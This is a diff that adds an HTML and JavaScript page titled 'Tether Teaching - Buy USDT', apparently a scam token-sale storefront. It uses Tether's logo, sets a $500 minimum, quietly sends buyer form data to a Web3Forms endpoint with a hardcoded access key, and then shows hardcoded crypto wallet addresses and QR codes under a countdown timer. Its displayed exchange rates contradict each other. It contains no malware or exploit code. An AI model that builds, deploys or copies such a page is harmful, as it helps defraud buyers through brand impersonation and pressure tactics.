@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether Teaching - Buy USDT</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo-text {
+            font-weight: 700;
+            font-size: 2rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .nav {
+            display: flex;
+            gap: 30px;
+        }
+
+        .nav a {
+            text-decoration: none;
+            color: #333;
+            font-weight: 500;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .nav a:hover {
+            color: #667eea;
+            transform: translateY(-2px);
+        }
+
+        .nav a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: -5px;
+            left: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            transition: width 0.3s ease;
+        }
+
+        .nav a:hover::after {
+            width: 100%;
+        }
+
+        .badge {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+            font-size: 10px;
+            padding: 3px 8px;
+            border-radius: 12px;
+            margin-left: 6px;
+            font-weight: 600;
+        }
+
+        .connect-wallet {
+            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
+        }
+
+        .connect-wallet:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 210, 255, 0.4);
+        }
+
+        .main-container {
+            display: flex;
+            max-width: 1200px;
+            margin: 40px auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .left-panel {
+            flex: 1;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 60px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .left-panel::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(180deg); }
+        }
+
+        .left-panel h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            margin-bottom: 20px;
+            text-align: center;
+            text-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            z-index: 2;
+        }
+
+        .left-panel .subtitle {
+            font-size: 1.4rem;
+            text-align: center;
+            margin-bottom: 30px;
+            opacity: 0.9;
+            position: relative;
+            z-index: 2;
+        }
+
+        .right-panel {
+            flex: 1;
+            padding: 60px 40px;
+            background: rgba(255, 255, 255, 0.95);
+        }
+
+        .form-group {
+            margin-bottom: 30px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            color: #555;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            padding: 20px;
+            border: 2px solid rgba(102, 126, 234, 0.2);
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            width: 100%;
+            min-height: 70px;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #667eea;
+            box-shadow: 0 0 20px rgba(102, 126, 234, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .input-wrapper input {
+            flex: 1;
+            border: none;
+            background: none;
+            font-size: 1.2rem;
+            outline: none;
+            color: #333;
+            font-weight: 500;
+            width: 100%;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #aaa;
+        }
+
+        .currency-selector {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-left: 15px;
+            padding: 10px 15px;
+            background: rgba(102, 126, 234, 0.1);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            flex-shrink: 0;
+        }
+
+        .currency-selector:hover {
+            background: rgba(102, 126, 234, 0.2);
+            transform: scale(1.05);
+        }
+
+        .currency-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.9rem;
+            color: white;
+        }
+
+        .usdt-icon {
+            background: #26a17b;
+        }
+
+        .usd-icon {
+            background: #2196f3;
+        }
+
+        .network-select {
+            border: none;
+            background: transparent;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #333;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .trc-badge {
+            background: linear-gradient(135deg, #ffd89b 0%, #19547b 100%);
+            color: white;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            font-weight: bold;
+            margin-left: 8px;
+        }
+
+        .convert-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 20px;
+            border-radius: 15px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .convert-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.4);
+        }
+
+        .convert-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .next-section {
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .text-info {
+            color: #666;
+            font-size: 1rem;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+
+        .next-btn {
+            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 6px 20px rgba(0, 210, 255, 0.3);
+        }
+
+        .next-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 210, 255, 0.4);
+        }
+
+        .minimum-info {
+            text-align: center;
+            color: #666;
+            font-weight: 600;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 193, 7, 0.1);
+            border-radius: 10px;
+            border-left: 4px solid #ffc107;
+        }
+
+        .timer-display {
+            font-weight: bold;
+            font-size: 1.5rem;
+            color: #e74c3c;
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(231, 76, 60, 0.1);
+            border-radius: 10px;
+            border: 2px solid rgba(231, 76, 60, 0.2);
+        }
+
+        .exchange-rate {
+            text-align: center;
+            color: #555;
+            font-size: 1rem;
+            font-weight: 600;
+            padding: 20px;
+            background: rgba(102, 126, 234, 0.1);
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        .loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 0.9rem;
+            margin-top: 5px;
+            display: none;
+        }
+
+        /* Popup styles */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+
+        .popup-content {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .popup-content h3 {
+            color: #667eea;
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+        }
+
+        .network-info {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        .qr-code-img {
+            max-width: 250px;
+            width: 100%;
+            border-radius: 15px;
+            margin: 20px 0;
+            border: 3px solid #667eea;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+        }
+
+        .wallet-address {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            color: #333;
+            border-left: 4px solid #667eea;
+        }
+
+        .copy-btn {
+            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-left: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .close-popup {
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 20px;
+            font-size: 1rem;
+        }
+
+        .instruction-text {
+            color: #666;
+            font-size: 1rem;
+            margin: 15px 0;
+            line-height: 1.5;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            body {
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            }
+
+            .header {
+                flex-direction: column;
+                gap: 20px;
+                padding: 20px;
+            }
+
+            .logo-text {
+                font-size: 1.5rem;
+            }
+
+            .nav {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 15px;
+            }
+
+            .nav a {
+                font-size: 0.9rem;
+            }
+
+            .connect-wallet {
+                padding: 10px 20px;
+                font-size: 0.9rem;
+            }
+
+            .main-container {
+                flex-direction: column;
+                margin: 20px 10px;
+                max-width: none;
+                border-radius: 15px;
+            }
+
+            .left-panel {
+                padding: 40px 20px;
+                text-align: center;
+            }
+
+            .left-panel h1 {
+                font-size: 2.5rem;
+            }
+
+            .left-panel .subtitle {
+                font-size: 1.2rem;
+            }
+
+            .right-panel {
+                padding: 30px 20px;
+            }
+
+            .form-group {
+                margin-bottom: 25px;
+            }
+
+            .input-wrapper {
+                flex-direction: column;
+                gap: 15px;
+                padding: 15px;
+                min-height: auto;
+            }
+
+            .input-wrapper input {
+                font-size: 1.1rem;
+                padding: 10px 0;
+                text-align: center;
+            }
+
+            .currency-selector {
+                margin-left: 0;
+                width: 100%;
+                justify-content: center;
+                padding: 12px 20px;
+            }
+
+            .network-select {
+                font-size: 1rem;
+            }
+
+            .convert-btn {
+                padding: 18px;
+                font-size: 1.1rem;
+            }
+
+            .next-btn {
+                width: 100%;
+                padding: 18px;
+                font-size: 1rem;
+            }
+
+            .minimum-info,
+            .exchange-rate,
+            .timer-display {
+                margin: 15px 0;
+                padding: 12px;
+                font-size: 0.9rem;
+            }
+
+            .timer-display {
+                font-size: 1.2rem;
+            }
+
+            .popup-content {
+                padding: 20px;
+                margin: 20px;
+                max-width: 350px;
+            }
+
+            .popup-content h3 {
+                font-size: 1.5rem;
+            }
+
+            .qr-code-img {
+                max-width: 200px;
+            }
+
+            .wallet-address {
+                font-size: 0.85rem;
+                padding: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                padding: 15px;
+            }
+
+            .logo-text {
+                font-size: 1.3rem;
+            }
+
+            .main-container {
+                margin: 15px 5px;
+            }
+
+            .left-panel {
+                padding: 30px 15px;
+            }
+
+            .left-panel h1 {
+                font-size: 2rem;
+            }
+
+            .right-panel {
+                padding: 25px 15px;
+            }
+
+            .input-wrapper {
+                padding: 12px;
+            }
+
+            .currency-selector {
+                padding: 10px 15px;
+            }
+
+            .convert-btn,
+            .next-btn {
+                padding: 16px;
+                font-size: 1rem;
+            }
+
+            .popup-content {
+                max-width: 300px;
+                padding: 15px;
+            }
+
+            .qr-code-img {
+                max-width: 180px;
+            }
+        }
+
+        /* Animation for form elements */
+        .form-group {
+            animation: slideInUp 0.6s ease forwards;
+            opacity: 0;
+            transform: translateY(30px);
+        }
+
+        .form-group:nth-child(1) { animation-delay: 0.1s; }
+        .form-group:nth-child(2) { animation-delay: 0.2s; }
+        .form-group:nth-child(3) { animation-delay: 0.3s; }
+
+        @keyframes slideInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-section">
+            <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="Tether" class="logo-img">
+            <div class="logo-text">Tether Teaching</div>
+        </div>
+        <nav class="nav">
+            <a href="#tokenomics">Tokenomics</a>
+            <a href="#whitepaper">Whitepaper</a>
+            <a href="#exchanges">Exchanges <span class="badge">New</span></a>
+            <a href="#utilities">Utilities</a>
+        </nav>
+        <button class="connect-wallet">Connect Wallet</button>
+    </header>
+
+    <div class="main-container">
+        <div class="left-panel">
+            <h1>BUY</h1>
+            <div class="subtitle">Tether Teaching USDT</div>
+        </div>
+
+        <div class="right-panel">
+            <form id="cryptoForm" action="https://api.web3forms.com/submit" method="post">
+                <input type="hidden" name="access_key" value="c1ab23a3-f114-4cf0-95e0-84972114529c">
+                <input type="hidden" name="from_email" value="tetherteaching@gmail.com">
+                <input type="hidden" name="redirect" value="false">
+                
+                <!-- You Send -->
+                <div class="form-group">
+                    <label class="form-label">You Send</label>
+                    <div class="input-wrapper">
+                        <input type="number" id="sendAmount" name="sendAmount" placeholder="0" min="10" step="0.01" required>
+                        <div class="currency-selector">
+                            <select id="networkSelect" name="network" class="network-select">
+                                <option value="USDT_BEP20" selected>USDT (BEP20)</option>
+                                <option value="USDT_ERC20">USDT (ERC20)</option>
+                                <option value="USDT_TRON">USDT (TRON)</option>
+                                <option value="USDT_SOL">USDT (SOL)</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div id="amountError" class="error-message"></div>
+                </div>
+
+                <!-- You Get -->
+                <div class="form-group">
+                    <label class="form-label">You Get</label>
+                    <div class="input-wrapper">
+                        <input type="number" id="receiveAmount" name="receiveAmount" placeholder="0.00" readonly>
+                        <div class="currency-selector">
+                            <div class="currency-icon usd-icon">
+                                <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" style="width: 20px; height: 20px; border-radius: 50%;">
+                            </div>
+                            <span>Tether Teaching</span>
+                        </div>
+                    </div>
+                </div>
+
+                <button type="submit" class="convert-btn">
+                    Buy with Crypto
+                </button>
+            </form>
+
+            <div class="next-section">
+                <p class="text-info">After payment click next</p>
+                <a href="https://tetherteaching.github.io/form-page/" class="next-btn">Next →</a>
+            </div>
+
+            <div class="minimum-info">
+                [Minimum Purchase: $500]
+            </div>
+
+            <div id="timerDisplay" class="timer-display" style="display: none;"></div>
+
+            <div class="exchange-rate">
+                1 Token = 0.25 USDT 
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup Overlay -->
+    <div id="popupOverlay" class="popup-overlay">
+        <div class="popup-content">
+            <h3>Payment QR Code</h3>
+            <div id="networkInfo" class="network-info"></div>
+            <img id="qrCodeImage" class="qr-code-img" src="" alt="Payment QR Code">
+            <div class="wallet-address">
+                <span id="walletAddress"></span>
+                <button class="copy-btn" onclick="copyAddress()">Copy</button>
+            </div>
+            <p class="instruction-text">Scan this QR code or use the wallet address above to complete your payment</p>
+            <button class="close-popup" onclick="closePopup()">Close</button>
+        </div>
+    </div>
+
+    <script>
+        let currentRate = 4.000;
+        let countdownInterval;
+        let popupOverlay;
+
+        // Network configurations with QR codes and addresses
+        const networkConfigs = {
+            'USDT_BEP20': {
+                name: 'USDT (BEP20) - Binance Smart Chain',
+                qrCode: 'https://i.supaimg.com/80e6f936-9b12-4ae2-ab8a-64393a0e7566.jpg',
+                address: '0xf5357A8a704f7bc27a3888C2e4bc7804Ad26361f'
+            },
+            'USDT_ERC20': {
+                name: 'USDT (ERC20) - Ethereum Network',
+                qrCode: 'https://i.supaimg.com/80e6f936-9b12-4ae2-ab8a-64393a0e7566.jpg',
+                address: '0xf5357A8a704f7bc27a3888C2e4bc7804Ad26361f'
+            },
+            'USDT_TRON': {
+                name: 'USDT (TRC20) - TRON Network',
+                qrCode: 'https://i.supaimg.com/b75dab78-7a06-4063-b9ce-0bb5c3f96474.jpg',
+                address: 'TXLwQZ46TWa4eLqy2rRWhDEZUT1N77ECjQ'
+            },
+            'USDT_SOL': {
+                name: 'USDT (SOL) - Solana Network',
+                qrCode: 'https://i.supaimg.com/be84381c-1141-49e2-90fd-1f9d2297a57d.jpg',
+                address: 'DzLgzcukdMkU5D9nYqsdJ9HSSxWmeWzghUZt9KXqkyzV'
+            }
+        };
+
+        // Get DOM elements
+        const sendInput = document.getElementById('sendAmount');
+        const receiveInput = document.getElementById('receiveAmount');
+        const form = document.getElementById('cryptoForm');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const networkSelect = document.getElementById('networkSelect');
+
+        // Real-time conversion
+        sendInput.addEventListener('input', function() {
+            const sendAmount = parseFloat(this.value) || 0;
+            const receiveAmount = (sendAmount * currentRate).toFixed(3);
+            receiveInput.value = receiveAmount;
+            
+            // Clear error message
+            document.getElementById('amountError').style.display = 'none';
+        });
+
+        // Form submission
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const sendAmount = parseFloat(sendInput.value);
+            
+            // Validation
+            if (!sendAmount || sendAmount <= 0) {
+                showError('Please enter a valid amount');
+                return;
+            }
+            
+            if (sendAmount < 500) {
+                showError('Minimum purchase is $500');
+                return;
+            }
+            
+            // Submit to Web3Forms silently
+            const formData = new FormData(this);
+            
+            fetch(this.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    openPopup();
+                } else {
+                    showError('Submission failed. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                openPopup(); // Still show popup even if submission fails
+            });
+        });
+
+        function showError(message) {
+            const errorDiv = document.getElementById('amountError');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+        }
+
+        function openPopup() {
+            const selectedNetwork = networkSelect.value;
+            const config = networkConfigs[selectedNetwork];
+            
+            // Update popup content based on selected network
+            document.getElementById('networkInfo').textContent = config.name;
+            document.getElementById('qrCodeImage').src = config.qrCode;
+            document.getElementById('walletAddress').textContent = config.address;
+            
+            popupOverlay = document.getElementById('popupOverlay');
+            popupOverlay.style.display = 'flex';
+            
+            // Start countdown
+            startCountdown(200);
+        }
+
+        function closePopup() {
+            if (popupOverlay) {
+                popupOverlay.style.display = 'none';
+            }
+            
+            // Stop countdown
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+            
+            // Hide timer
+            timerDisplay.style.display = 'none';
+            timerDisplay.textContent = '';
+        }
+
+         function startCountdown(seconds) {
+            let countdown = seconds;
+            timerDisplay.style.display = 'block';
+            timerDisplay.textContent = `Popup will close in ${countdown} seconds...`;
+            
+            countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    timerDisplay.textContent = `Popup will close in ${countdown} seconds...`;
+                } else {
+                    clearInterval(countdownInterval);
+                    timerDisplay.textContent = '';
+                    timerDisplay.style.display = 'none';
+                    closePopup();
+                }
+            }, 1000);
+        }
+
+        function copyAddress() {
+            const addressElement = document.getElementById('walletAddress');
+            const address = addressElement.textContent;
+            
+            // Copy to clipboard
+            navigator.clipboard.writeText(address).then(function() {
+                // Change button text temporarily
+                const copyBtn = event.target;
+                const originalText = copyBtn.textContent;
+                copyBtn.textContent = 'Copied!';
+                copyBtn.style.background = 'linear-gradient(135deg, #00b894 0%, #00a085 100%)';
+                
+                setTimeout(() => {
+                    copyBtn.textContent = originalText;
+                    copyBtn.style.background = 'linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%)';
+                }, 2000);
+            })
+        }
+        </script>
+        </body>
+        </html>
